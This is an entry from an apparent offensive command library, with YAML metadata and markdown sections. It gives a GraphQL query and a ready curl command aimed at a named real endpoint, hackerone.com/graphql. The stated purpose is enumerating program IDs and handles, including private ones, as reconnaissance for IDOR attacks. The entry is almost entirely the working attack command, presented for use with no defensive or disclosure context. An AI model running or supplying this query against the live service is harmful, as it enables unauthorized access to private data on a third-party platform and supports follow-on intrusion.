---
data: '{"query":"{teams(where:{state:{_eq:null}}){total_count,nodes{_id,handle}}}"}'
tags:
  - graphql
  - enumeration
type: command
executor: bash
platforms:
  - Web
id: fe01188a-d036-4616-b729-4fd5b121d92e
created_at: '2025-12-11T03:48:05.932Z'
updated_at: '2025-12-11T03:48:05.932Z'
verified: false
validated: true
submitted: true
---
# graphql-enumerate-programs

## Command

```json
{"query":"{teams(where:{state:{_eq:null}}){total_count,nodes{_id,handle}}}"}
```

## Description

This command sends a GraphQL query to enumerate program IDs and handles from teams with null state, used for reconnaissance in IDOR attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `query` | GraphQL query string for teams | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" --data '{"query":"{teams(where:{state:{_eq:null}}){total_count,nodes{_id,handle}}}"}' https://hackerone.com/graphql
```

## Expected Output

JSON with total_count and nodes containing _id and handle for programs, including private ones.

## Related

- [[procedures/Enumerate-HackerOne-Program-IDs-via-GraphQL]]
